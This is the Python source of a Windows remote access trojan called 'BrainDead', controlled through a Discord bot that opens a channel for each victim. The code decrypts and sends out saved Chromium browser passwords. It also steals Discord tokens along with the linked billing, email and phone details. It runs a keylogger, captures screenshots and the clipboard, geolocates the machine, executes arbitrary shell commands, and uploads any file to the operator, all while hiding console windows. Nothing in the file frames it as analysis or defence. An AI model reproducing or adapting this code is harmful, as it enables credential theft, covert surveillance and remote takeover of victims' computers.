import os
import re
import sys
import uuid
import json
import time
import ctypes
import base64
import random
import string
import socket
import shutil
import asyncio
import sqlite3
import platform
import threading
import subprocess
import ctypes.wintypes

agent_version = "2.0.0"
python_path = sys.executable

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
def InstallPackages(packages):
    for package in packages:
        subprocess.run([python_path, "-m", "pip", "install", package], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

InstallPackages(packages=["requests", "pycryptodome", "nextcord", "pynput", "pillow"])

import nextcord as discord
import requests

from PIL import Image
from Crypto.Cipher import AES
from pynput.keyboard import Key, Listener

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
# ****** Discord ****** #
bot_login_token = "%token%"  # %token%
guild_id = 1335193091275096156


path_localappdata = os.getenv('LOCALAPPDATA')
path_roaming = os.getenv('APPDATA')

installation_folder = f"C:\\Users\\{os.getlogin()}\\My Games"
if not os.path.exists(installation_folder):
    os.mkdir(installation_folder)

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
discordTokens = []
discordUIDS = []
discordCommonPaths = {'Discord': path_roaming + '\\discord\\Local Storage\\leveldb\\','Discord Canary': path_roaming + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': path_roaming + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': path_roaming + '\\discordptb\\Local Storage\\leveldb\\','Opera': path_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': path_roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': path_localappdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': path_localappdata + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': path_localappdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': path_localappdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': path_localappdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': path_localappdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': path_localappdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': path_localappdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': path_localappdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': path_localappdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': path_localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': path_localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': path_localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': path_localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': path_localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': path_localappdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': path_localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': path_localappdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': path_localappdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': path_localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': path_localappdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}

browsersPasswords = []
chromiumBrowsers = [{"name": "Google Chrome", "path": os.path.join(path_localappdata, "Google", "Chrome", "User Data"), "taskname": "chrome.exe"},{"name": "Microsoft Edge", "path": os.path.join(path_localappdata, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe"},{"name": "Opera", "path": os.path.join(path_roaming, "Opera Software", "Opera Stable"), "taskname": "opera.exe"},{"name": "Opera GX", "path": os.path.join(path_roaming, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe"},{"name": "Brave", "path": os.path.join(path_localappdata, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe"},{"name": "Yandex", "path": os.path.join(path_roaming, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe"},]
chromiumSubpaths = [{"name": "None", "path": ""},{"name": "Default", "path": "Default"},{"name": "Profile 1", "path": "Profile 1"},{"name": "Profile 2", "path": "Profile 2"},{"name": "Profile 3", "path": "Profile 3"},{"name": "Profile 4", "path": "Profile 4"},{"name": "Profile 5", "path": "Profile 5"},]

keyloggerStatut = False
keyloggerPressedKeys = []

cmdDirectory = ""

# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ============================================================================================ UTILITY =============================================================================================================== #
def GetSessionName():
    return f"{os.getlogin().lower()}-{'-'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])}"

def GetRandomString(length: int) -> str:
    return ''.join(random.choices(string.ascii_letters, k=length))

def SafeRemove(path):
    try:
        if os.path.exists(path):
            os.remove(path)
    except Exception as e:
        pass

def GetTime():
    return time.strftime("%H:%M:%S", time.localtime())

def KillProcess(processName):
    result = subprocess.run(["tasklist"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
    if processName not in result.stdout:
        return
    subprocess.run(["taskkill", "/F", "/IM", processName], capture_output=True, text=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)

def GenerateTree(path: str, prefix: str = "", current_depth: int = 0, max_depth: int = 3) -> str:
    tree_str = ""
    
    if not os.path.isdir(path):
        return f"[Erreur] {path} n'est pas un dossier valide.\n"
    
    try:
        entries = sorted(os.listdir(path), key=lambda e: (os.path.isfile(os.path.join(path, e)), e.lower()))
    except PermissionError:
        return f"[Erreur] Accès refusé à {path}.\n"
    
    for index, entry in enumerate(entries):
        entry_path = os.path.join(path, entry)
        is_last = (index == len(entries) - 1)
        connector = "└── " if is_last else "├── "

        if os.path.isdir(entry_path):
            emoji = "📁 "
        elif entry.lower().endswith(".txt"):
            emoji = "📄 "
        elif entry.lower().endswith(".pdf"):
            emoji = "📕 "
        else:
            emoji = ""

        tree_str += f"{prefix}{connector}{emoji}{entry}\n"

        if os.path.isdir(entry_path) and (current_depth < max_depth):
            new_prefix = prefix + ("    " if is_last else "│   ")
            tree_str += GenerateTree(entry_path, new_prefix, current_depth + 1, max_depth)

    return tree_str


# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
# ==================================================================================================================================================================================================================== #
def GetClipboard():
    return subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip()

class LASTINPUTINFO(ctypes.Structure):
    _fields_ = [("cbSize", ctypes.c_uint), ("dwTime", ctypes.c_uint)]
def GetIdleTime():
    lii = LASTINPUTINFO()
    lii.cbSize = ctypes.sizeof(LASTINPUTINFO)
    if ctypes.windll.user32.GetLastInputInfo(ctypes.byref(lii)):
        millis = ctypes.windll.kernel32.GetTickCount() - lii.dwTime
        return millis / 1000
    return 0

class BITMAPINFOHEADER(ctypes.Structure):
    _fields_ = [("biSize", ctypes.wintypes.DWORD),("biWidth", ctypes.wintypes.LONG),("biHeight", ctypes.wintypes.LONG),("biPlanes", ctypes.wintypes.WORD),("biBitCount", ctypes.wintypes.WORD),("biCompression", ctypes.wintypes.DWORD),("biSizeImage", ctypes.wintypes.DWORD),("biXPelsPerMeter", ctypes.wintypes.LONG),("biYPelsPerMeter", ctypes.wintypes.LONG),("biClrUsed", ctypes.wintypes.DWORD),("biClrImportant", ctypes.wintypes.DWORD),]

def Screenshot():
    user32 = ctypes.windll.user32
    gdi32 = ctypes.windll.gdi32
    screen_width = user32.GetSystemMetrics(0)
    screen_height = user32.GetSystemMetrics(1)
    hdc_screen = user32.GetDC(0)
    hdc_mem = gdi32.CreateCompatibleDC(hdc_screen)
    hbm = gdi32.CreateCompatibleBitmap(hdc_screen, screen_width, screen_height)
    gdi32.SelectObject(hdc_mem, hbm)
    gdi32.BitBlt(hdc_mem, 0, 0, screen_width, screen_height, hdc_screen, 0, 0, 0x00CC0020)
    bmp_info = BITMAPINFOHEADER()
    bmp_info.biSize = ctypes.sizeof(BITMAPINFOHEADER)
    bmp_info.biWidth = screen_width
    bmp_info.biHeight = -screen_height
    bmp_info.biPlanes = 1
    bmp_info.biBitCount = 32
    bmp_info.biCompression = 0
    buffer_size = screen_width * screen_height * 4
    buffer = ctypes.create_string_buffer(buffer_size)
    gdi32.GetDIBits(hdc_screen, hbm, 0, screen_height, buffer, ctypes.byref(bmp_info), 0)
    gdi32.DeleteObject(hbm)
    gdi32.DeleteDC(hdc_mem)
    user32.ReleaseDC(0, hdc_screen)
    image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
    image.save(f"{installation_folder}\\{os.getlogin()} - Screenshot.png")

# ____________________________________________________________________________________________________________________________________________________ #
# ========================================================== DISCORD FUNCS =========================================================================== #
def ValidateToken(token: str) -> bool:
    r = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token})
    if r.status_code == 200: 
        return True
    return False

def DecryptVal(buff: bytes, master_key: bytes) -> str:
    iv = buff[3:15]
    payload = buff[15:]
    cipher = AES.new(master_key, AES.MODE_GCM, iv)
    decrypted_pass = cipher.decrypt(payload)
    decrypted_pass = decrypted_pass[:-16].decode()
    return decrypted_pass

def GetMasterKey(path: str) -> str:
    if not os.path.exists(path):
        return None
    if 'os_crypt' not in open(path, 'r', encoding='utf-8').read():
        return None

    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(master_key), ctypes.cast(master_key, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        decrypted_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
        ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
        return decrypted_key

def GetDiscordTokens():
    for name, path in discordCommonPaths.items():
        if not os.path.exists(path): continue
        _discord = name.replace(" ", "").lower()
        if "cord" in path:
            if not os.path.exists(path_roaming + f'\{_discord}\Local State'): continue
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for y in re.findall(discordRegexpEnc, line):
                        token = DecryptVal(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), GetMasterKey(path_roaming + f'\{_discord}\Local State'))

                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

        else:
            for file_name in os.listdir(path):
                if file_name[-3:] not in ["log", "ldb"]: continue
                for line in [x.strip() for x in open(f'{path}\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(discordRegexp, line):
                        if ValidateToken(token):
                            uid = requests.get('https://discord.com/api/v9/users/@me', headers={'Authorization': token}).json()['id']
                            if uid not in discordUIDS:
                                discordTokens.append(token)
                                discordUIDS.append(uid)

def ExtractInfosFromToken():
    if not discordTokens:
        return

    final_to_return = []
    for token in discordTokens:
        user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
        billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()

        username = user['username'] + '#' + user['discriminator']
        user_id = user['id']
        email = user['email']
        phone = user['phone']
        mfa = user['mfa_enabled']

        if user['premium_type'] == 0:
            nitro = 'None'
        elif user['premium_type'] == 1:
            nitro = 'Nitro Classic'
        elif user['premium_type'] == 2:
            nitro = 'Nitro'
        elif user['premium_type'] == 3:
            nitro = 'Nitro Basic'
        else:
            nitro = 'None'

        if billing:
            payment_methods = []
            for method in billing:
                if method['type'] == 1:
                    payment_methods.append('Credit Card')
                elif method['type'] == 2:
                    payment_methods.append('PayPal')
                else:
                    payment_methods.append('Unknown')
            payment_methods = ', '.join(payment_methods)
        else:
            payment_methods = None

        final_message = (f'\nUsername: {username} ({user_id})'
                         f'\nToken: {token}'
                         f'\nNitro: {nitro}'
                         f'\nBilling: {payment_methods if payment_methods != "" else "None"}'
                         f'\nMFA: {mfa}'
                         f'\nEmail: {email if email != None else "None"}'
                         f'\nPhone: {phone if phone != None else "None"}'
                         f'\n==============')
        final_to_return.append(final_message)

    return final_to_return

# _____________________________________________________________________________________________________________________________________________________ #
# ================================================================= CHROMIUM FUNCS ==================================================================== #
def DecryptData(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        try:
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(ctypes.byref(pDataIn),None,None,None,None,0,ctypes.byref(pDataOut)):
                decrypted_data = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
                return decrypted_data.decode()

        except Exception as e:
            return f"Failed to decrypt data: {e}"

def ExtractPasswords():
    for browser in chromiumBrowsers:
        KillProcess(browser['taskname'])
        local_state_path = os.path.join(browser['path'], 'Local State')
        if not os.path.exists(local_state_path):
            continue

        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)

        try:
            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            
            class DATA_BLOB(ctypes.Structure):
                _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

            pDataIn = DATA_BLOB(len(key), ctypes.cast(key, ctypes.POINTER(ctypes.c_ubyte)))
            pDataOut = DATA_BLOB()

            if ctypes.windll.Crypt32.CryptUnprotectData(
                ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)
            ):
                decryption_key = bytes((ctypes.c_ubyte * pDataOut.cbData).from_address(ctypes.addressof(pDataOut.pbData.contents)))
                ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
            else:
                raise ValueError("Failed to decrypt master key.")
        except Exception as e:
            print(f"Error decrypting master key :: {e}")
            continue

        for subpath in chromiumSubpaths:
            login_data_path = os.path.join(browser['path'], subpath['path'], 'Login Data')
            if not os.path.exists(login_data_path):
                continue

            try:
                temp_db = os.path.join(browser['path'], subpath['path'], f"{browser['name']}-pw.db")
                shutil.copy(login_data_path, temp_db)

                connection = sqlite3.connect(temp_db)
                cursor = connection.cursor()
                query_passwords = "SELECT origin_url, username_value, password_value FROM logins"
                cursor.execute(query_passwords)

                for row in cursor.fetchall():
                    origin_url = row[0]
                    username = row[1]
                    encrypted_password = row[2]
                    password = DecryptData(encrypted_password, decryption_key)

                    if username or password:
                        browsersPasswords.append(
                            {
                                "url": origin_url,
                                "username": username,
                                "password": password,
                            }
                        )

                cursor.close()
                connection.close()
                os.remove(temp_db)

            except Exception as e:
                continue


# ______________________________________________________________________________________________________________________________________________________ #
# ================================================================= KEYLOGGER FUNCS ==================================================================== #
def OnPress(key):
    global keyloggerPressedKeys, keyloggerStatut

    if not keyloggerStatut:
        return

    keyCodes = {
        Key.space: " ",
        Key.shift: "",
        Key.tab: " [TAB] ",
        Key.backspace: " [DEL] ",
        Key.esc: " [ESC] ",
        Key.caps_lock: " [CAPS LOCK] ",
        Key.enter: " [ENTER] ",
        Key.shift_r: ""
    }
    
    try:
        if key.char:
            keyloggerPressedKeys.append(key.char)
        else:
            keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))
    except AttributeError:
        keyloggerPressedKeys.append(keyCodes.get(key, f' [{key}] '))

def KeyloggerThread():
    with Listener(on_press=OnPress) as listen:
        listen.join()


# __________________________________________________________________________________________________________________________________________________ #
# =============================================================== DISCORD BOT ====================================================================== #
class Client(discord.Client):

    # _____________________________________________________________________________________________________________________________________________________ #
    # ============================================================== CHANNELS SETUP ======================================================================= #
    @staticmethod
    async def on_ready():
        for guild in client.guilds:
            if guild.id == guild_id:
                # ****** Commands channel ****** #
                current_session = discord.utils.get(guild.text_channels, name=GetSessionName())

                if current_session is None:
                    current_session = await guild.create_text_channel(GetSessionName())
                    await current_session.purge()

                    embed = discord.Embed(title=f":wireless: BrainDead", description=f"**BrainDead v{agent_version} Pro**", color=discord.Color.blue())
                    embed.add_field(name="", value=f"```{GetTime()} - BrainDead agent initialised\n{GetTime()} - Keylogger initialised\n```", inline=False)
                    await current_session.send(embed=embed)
                else:
                    await current_session.purge()

                    embed = discord.Embed(title=f":wireless: BrainDead", description=f"BrainDead v{agent_version} Pro", color=discord.Color.blue())
                    embed.add_field(name="", value=f"```{GetTime()} - BrainDead agent initialised\n{GetTime()} - Keylogger initialised\n```", inline=False)
                    await current_session.send(embed=embed)

                # ****** Other channel ****** #


        # ____________________________________________________________________________________________________________________________________________________ #
        # ================================================================= HACKS THREADS ==================================================================== #
        th_keylogger = threading.Thread(target=KeyloggerThread)
        th_keylogger.start()


    # _________________________________________________________________________________________________________________________________________________ #
    # ===================================================================== COMMUNICATIONS ================================================================ #
    async def on_message(self, message):
        global keyloggerStatut, keyloggerPressedKeys, cmdDirectory

        if message.author == self.user:
            return
        
        channel = message.channel
        if channel.name == GetSessionName():
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .ping ================================================================== #
            if message.content == ".ping":
                await message.delete()
                
                embed = discord.Embed(description=f":wireless: Session status : `alive`", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .help ================================================================== #
            elif message.content == ".help":
                await message.delete()

                embed = discord.Embed(description=f"**Help Menu :**\n- `.ping` : Show connected devices\n- `.clear` : Clear the current text channel\n- `.kill <process.exe>` : Kill process\n- `.clipboard` : Show copied elements\n- `.grab discord` : Grab user's Discord informations\n- `.grab password` : Grab passwords from web browser\n- `.system` : Grab PC informations\n- `.screenshot` : Take a screenshot\n- `.start keylogger` : Start the keylogger\n- `.stop keylogger` : Stop the keylogger and send keys pressed\n- `.cd <path>` : Change  the working directory\n- `.sh <cmd>` : Execute cmd commands\n- `.download <path/to/file>` : Download a file from the computer\n- `.idle` : Show in secondes the afk time", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # ====================================================================== .clear =============================================================== #
            elif message.content == ".cl" or message.content == ".clear":
                await message.channel.purge()

            # ____________________________________________________________________________________________________________________________________________ #
            # ================================================================== .kill =================================================================== #
            elif message.content.startswith(".kill"):
                await message.delete()

                command = message.content.replace(".kill ", "", 1)

                try:
                    KillProcess(command)
                    embed = discord.Embed(description=f":small_red_triangle_down: Process `{command}` terminated", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                except:
                    embed = discord.Embed(description=f":no_entry: Cannot terminate process `{command}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _________________________________________________________________________________________________________________________________________________ #
            # ================================================================== .clipboard =================================================================== #
            elif message.content == ".cb" or message.content == ".clipboard":
                await message.delete()

                clipboard = GetClipboard()
                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w") as f:
                    f.write(clipboard)
                
                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Clipboard.txt")
                await message.channel.send(file=file_embed)

                SafeRemove(file_path)

            # ____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab discord ================================================================== #
            elif message.content == ".grab discord":
                await message.delete()
                
                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                GetDiscordTokens()
                tokens = ExtractInfosFromToken()

                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w") as f:
                    for token in tokens:
                        f.write(token)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Discord Tokens.txt")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()
                SafeRemove(file_path)

            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .grab password ================================================================== #
            elif message.content == ".grab password" or message.content == ".grab passwords":
                await message.delete()
                
                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                ExtractPasswords()
                formatted = ""
                for entry in browsersPasswords:
                    formatted += (
                        f"URL:            {entry['url']}\n"
                        f"Username:       {entry['username']}\n"
                        f"Password:       {entry['password']}\n"
                        f"==============\n")

                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w") as f:
                    f.write(formatted)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Passwords.txt")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()

                SafeRemove(file_path)

            # _______________________________________________________________________________________________________________________________________________ #
            # =================================================================== .system ================================================================== #
            elif message.content == ".system" or message.content == ".sys":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                requInfos = requests.get('https://ipinfo.io')
                data = requInfos.json()

                session = os.getlogin()
                computer_name = socket.gethostname()
                os_version = platform.system() + " " + platform.release()
                architecture = platform.machine()
                mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
                ip = data.get('ip')
                country = data.get('country')
                region = data.get('region')
                city = data.get('city')
                loc = data.get('loc')
                org = data.get('org')
                cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip().split('\n')[2]
                ram = subprocess.run(["powershell", "-Command", "Get-Process | Measure-Object -Property WorkingSet64 -Sum | ForEach-Object { \"{0:N2} MB\" -f ($_.Sum / 1MB) }"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850").stdout.strip()

                embed = discord.Embed(description="", color=discord.Color.blue())
                embed.add_field(name=":computer: **Global Info**", value=f"```ansi\nComputer@Username : {computer_name}@{session}\nOperative System : {os_version}\nArchitecture : {architecture}\nIdle Time : {GetIdleTime()}s```", inline=True)
                embed.add_field(name=":floppy_disk: **Hardware**", value=f"```ansi\nRAM : {ram}\nCPU : {cpu}```", inline=True)
                embed.add_field(name=":satellite: **Network Info**", value=f"```ansi\nPublic IP : {ip}\nMAC : {mac}\nCountry : {country}\nRegion : {region}\nCity : {city}\nLocalisation : {loc}\nInternet Provider : {org}```", inline=False)
                await message.channel.send(embed=embed)

                await loading_embed.delete()

            # __________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .screenshot ================================================================== #
            elif message.content == ".ss" or message.content == ".screenshot":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                Screenshot()

                embed = discord.Embed(
                    title="",
                    description=f"**{GetTime()} - `[Manual]`**",
                    color=discord.Color.blue()
                )

                screenshot_path = f"{installation_folder}\\{os.getlogin()} - Screenshot.png"
                screenshot_filename = "screenshot.png"

                screenshot_file = discord.File(screenshot_path, filename=screenshot_filename)

                embed.set_image(url=f"attachment://{screenshot_filename}")

                await channel.send(embed=embed, file=screenshot_file)

                #await asyncio.sleep(1)

                SafeRemove(screenshot_path)
                await loading_embed.delete()

            # _________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .keylogger ================================================================== #
            elif message.content == ".start keylogger":
                await message.delete()

                if keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already activated : use `.stop keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return
                
                keyloggerStatut = True
                embed = discord.Embed(description=f":keyboard: Keylogger has started", color=discord.Color.blue())
                await message.channel.send(embed=embed)

            elif message.content == ".stop keylogger":
                await message.delete()

                if not keyloggerStatut:
                    embed = discord.Embed(description=f":no_entry: Keylogger already **OFF** : use `.start keylogger`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                embed = discord.Embed(description=f":keyboard: Keylogger is stopped !", color=discord.Color.red())
                await message.channel.send(embed=embed)
                keyloggerStatut = False

                embed = discord.Embed(description=":incoming_envelope: Uploading... This action may take time !", color=discord.Color.yellow())
                embed_sent = await message.channel.send(embed=embed)
                
                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                finalMessage = ""
                for key in keyloggerPressedKeys:
                    finalMessage += key
                with open(file_path, "w") as f:
                    f.write(finalMessage)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Keylogger Logs.txt")
                await message.channel.send(file=file_embed)

                await embed_sent.delete()

                SafeRemove(file_path)

            # __________________________________________________________________________________________________________________________________________ #
            # =================================================================== .cd ================================================================== #
            elif message.content.startswith(".cd"):
                await message.delete()

                command = message.content.replace(".cd ", "", 1)

                try:
                    os.chdir(command)
                    cmdDirectory = os.getcwd()
                except:
                    embed = discord.Embed(description=f":no_entry: Unkown directory : `{command}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)

            # _____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .sh ================================================================== #
            elif message.content.startswith(".sh"):
                await message.delete()

                command = message.content.replace(".sh ", "", 1)

                try:
                    finalCommand = ["cmd", "/c", command]
                    result = subprocess.run(finalCommand, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW, encoding="cp850")

                    embed = discord.Embed(description=f"Command executed successfully", color=discord.Color.blue())

                    if result.stdout and result.stdout.strip():
                        file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                        with open(file_path, "w", encoding="utf-8") as f:
                            f.write(result.stdout.strip())
                        
                        file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Commande Output.txt")
                        await message.channel.send(file=file_embed)
                        
                    await message.channel.send(embed=embed)
                    SafeRemove(file_path)
                except Exception as e:
                    embed = discord.Embed(description=f":no_entry: Unexpected error : `{e}`", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    SafeRemove(file_path)

            # ________________________________________________________________________________________________________________________________________________ #
            # =================================================================== .download ================================================================== #
            elif message.content.startswith(".download"):
                await message.delete()

                command = message.content.replace(".download ", "", 1)
                
                if not os.path.exists(command):
                    embed = discord.Embed(description=":no_entry: Invalid file path", color=discord.Color.red())
                    await message.channel.send(embed=embed)
                    return

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                file_path = command
                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - {os.path.basename(file_path)}")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()

            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .idle ================================================================== #
            elif message.content == ".idle":
                await message.delete()

                embed = discord.Embed(description=f":stopwatch: Last input recorded `{GetIdleTime()}` seconds ago", color=discord.Color.blue())
                await message.channel.send(embed=embed)
            
            # ____________________________________________________________________________________________________________________________________________ #
            # =================================================================== .dir ================================================================== #
            elif message.content == ".dir":
                await message.delete()

                loading_embed = discord.Embed(description=":incoming_envelope: Processing file", color=discord.Color.yellow())
                loading_embed = await message.channel.send(embed=loading_embed)

                tree = GenerateTree(cmdDirectory, max_depth=4)

                file_path = f"{installation_folder}/{GetRandomString(17)}.txt"
                with open(file_path, "w", encoding="utf-8") as f:
                    f.write(tree)

                file_embed = discord.File(file_path, filename=f"{os.getlogin()} - Tree.txt")
                await message.channel.send(file=file_embed)

                await loading_embed.delete()
            # _____________________________________________________________________________________________________________________________________________________ #
            # =================================================================== unkown command ================================================================== #
            elif message.content.startswith("."):
                await message.delete()

                embed = discord.Embed(description=f":no_entry: Unkown command `{message.content}`", color=discord.Color.red())
                await message.channel.send(embed=embed)
                


intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(bot_login_token)